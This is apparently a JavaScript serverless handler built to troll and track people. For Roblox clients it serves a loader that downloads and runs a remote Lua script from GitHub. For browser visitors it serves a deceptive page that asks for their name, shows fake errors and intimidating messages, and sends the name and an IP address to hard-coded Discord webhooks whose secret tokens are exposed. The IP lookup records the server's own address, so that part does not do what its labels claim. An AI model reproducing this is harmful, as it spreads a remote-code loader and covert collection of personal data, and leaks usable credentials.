import fetch from 'node-fetch';

const ipifyUrl = 'https://api.ipify.org?format=json'; // API to get the user's IP address

export default async function handler(req, res) {
  const userAgent = req.headers['user-agent'] || '';

  // Roblox client loading
  if (userAgent.includes('Roblox') || userAgent === '') {
    res.setHeader('Content-Type', 'text/plain');
    res.status(200).send(`
      print("Script loaded!")
      loadstring(game:HttpGet("https://raw.githubusercontent.com/Nakhun12310/CookieHub/main/OldFluentFisch.lua"))()
    `);
  } else if (req.method === 'POST') {
    // Handle submitted messages (skid or regular)
    let body = '';
    req.on('data', (chunk) => {
      body += chunk.toString();
    });
    req.on('end', async () => {
      const data = JSON.parse(body);
      let name = data.name || 'Unknown';
      let message = data.message || 'No message';

      // Prevent @everyone and @here pings
      name = name.replace(/@/g, '@\u200b');
      message = message.replace(/@/g, '@\u200b');

      // Get IP address using ipify API
      let ipAddress = 'Unknown IP';
      try {
        const ipResponse = await fetch(ipifyUrl);
        const ipData = await ipResponse.json();
        ipAddress = ipData.ip || 'Unknown IP';
      } catch (error) {
        console.error('Error fetching IP:', error);
      }

      // Send name and message to the first webhook (skid info)
      const skidWebhookUrl = 'https://discord.com/api/webhooks/1365679141168353371/MTveez8isOYXF7RSALX36yGcu-cdIYMiGh73d-2czgL1tCZiaMlmD2f-xGU9A15h2p5_';
      try {
        await fetch(skidWebhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `**New Skid Message**\n**Name:** ${name}\n**Message:** ${message}`,
          }),
        });
      } catch (error) {
        console.error('Error sending skid message:', error);
      }

      // Send IP address and name to the second webhook (IP info)
      const ipWebhookUrl = 'https://discord.com/api/webhooks/1365685136485515505/LxhMw0xyxwMbUqcAKhDSxvhJjTl9AXnOQ883hP2sbBY8xLWDCv6I6y16xDy_Quxk0Q5l';
      try {
        await fetch(ipWebhookUrl, {
          method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: `**IP Address Detected**\n**IP Address:** ${ipAddress}\n**Real Name:** ${name}`,
        }),
      });
    } catch (error) {
        console.error('Error sending IP data:', error);
      }

      // Send a message to the troll webhook
      const trollWebhookUrl = 'https://discord.com/api/webhooks/your_troll_webhook_url_here';
      try {
        await fetch(trollWebhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            content: `This skidder ${name} has been trolled!`,
          }),
        });
      } catch (error) {
        console.error('Error sending troll message:', error);
      }

      res.status(200).json({ success: true });
    });
  } else {
    // If GET request or other type, serve HTML page with loading and song
    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="UTF-8">
        <title>What Are You Doing</title>
        <style>
          body {
            background-color: black;
            color: white;
            font-family: monospace;
            text-align: center;
            margin-top: 100px;
          }
          #loading-bar {
            width: 0;
            height: 30px;
            background-color: red;
            margin-top: 20px;
            transition: width 3s ease-in-out;
          }
          #loading-text {
            font-size: 24px;
            margin-top: 20px;
          }
          audio {
            display: none;
          }
          h1 {
            font-size: 50px;
            color: yellow;
          }
          .troll-text {
            font-size: 20px;
            color: green;
            margin-top: 30px;
            text-shadow: 2px 2px 5px red;
          }
          .error-text {
            color: red;
            font-size: 18px;
            font-weight: bold;
            text-shadow: 2px 2px 5px black;
            margin-top: 40px;
          }
        </style>
      </head>
      <body>
        <h1>What Are You Doing</h1>
        <p>Enter your name to proceed:</p>
        <input type="text" id="nameBox" placeholder="Your Name"><br>
        <button onclick="startTroll()">Say sorry</button>

        <div id="loading-bar"></div>
        <div id="loading-text">Loading... Please wait!</div>
        <div class="troll-text" id="troll-text">You thought you were going to get something cool...</div>

        <audio id="song" autoplay loop>
          <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mp3">
        </audio>

        <script>
          function startTroll() {
            const name = document.getElementById('nameBox').value;
            if (!name) {
              alert('Please enter your name!');
              return;
            }

            // Send name to the server before starting the troll
            fetch(window.location.pathname, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify({
                name: name,
                message: "Just got trolled"
              })
            });

            // Simulate a crazy loading bar with random breaks
            fakeLoadingBar(name);
          }

          function fakeLoadingBar(name) {
            const loadingBar = document.getElementById('loading-bar');
            const loadingText = document.getElementById('loading-text');
            const trollText = document.getElementById('troll-text');
            const errorText = document.createElement('div');
            errorText.classList.add('error-text');
            document.body.appendChild(errorText);
            let fakeProgress = 0;
            let randomDelay = 1000;

            function randomizeProgress() {
              const randomTime = Math.random() * 2000 + 1000; // Randomized loading time
              fakeProgress = Math.min(fakeProgress + Math.random() * 20, 100); // Increase progress
              loadingBar.style.width = fakeProgress + '%';
              if (fakeProgress >= 50 && fakeProgress < 100) {
                loadingText.innerText = 'Loading... Almost there!';
              }

              if (fakeProgress < 100) {
                setTimeout(randomizeProgress, randomTime); // Continue loading
              } else {
                loadingText.innerText = 'Done loading! Redirecting you...';
                setTimeout(() => {
                  window.location.href = "https://m.youtube.com/watch?v=dQw4w9WgXcQ&pp=ygULcmljayBhc3RsZXk%3D"; // Rickroll URL
                }, 1000); // Redirect after 1 second
              }
            }

            randomizeProgress();

            // Show random fake errors
            setInterval(() => {
              const errorMessages = [
                "404 - Page Not Found",
                "Critical System Error!",
                "Loading Failed! Please Try Again Later.",
                "Your Internet Connection is Too Slow!",
                "Error: Invalid Username or Password"
              ];
              errorText.innerText = errorMessages[Math.floor(Math.random() * errorMessages.length)];
            }, 5000); // Change error message every 5 seconds

            // Update troll text every 3 seconds
            setInterval(() => {
              const trollMessages = [
                "You can't escape!",
                "This is where the fun begins...",
                "I'm watching you!",
                "This isn't over!",
                "Get ready for the surprise!"
              ];
              trollText.innerText = trollMessages[Math.floor(Math.random() * trollMessages.length)];
            }, 3000);

            // Randomize background music
            const songs = [
              "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3",
              "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3",
              "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-3.mp3"
            ];
            const randomSong = songs[Math.floor(Math.random() * songs.length)];
            const audio = document.getElementById('song');
            audio.src = randomSong;
          }
        </script>
      </body>
      </html>
    `);
  }
}
